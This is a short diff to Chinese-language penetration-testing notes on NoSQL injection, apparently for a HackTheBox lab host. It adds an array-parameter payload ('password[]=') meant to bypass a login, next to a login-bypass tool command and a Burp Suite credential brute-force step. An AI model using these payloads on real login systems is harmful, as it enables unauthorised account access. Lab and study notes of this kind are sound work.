@@ -10,6 +10,12 @@ https://github.com/C4l1b4n/NoSQL-Attack-Suite
 ./nosql-login-bypass.py -t http://staging-order.mango.htb -u username -p password -o "login=login"
 ```
 
+- 基本绕过尝试
+```sql
+username=admin&password[]=
+```
+
+
 **爆破凭据** 
 - 使用 burpsuite，选中 `&data&` , a-Z 爆破
 ```
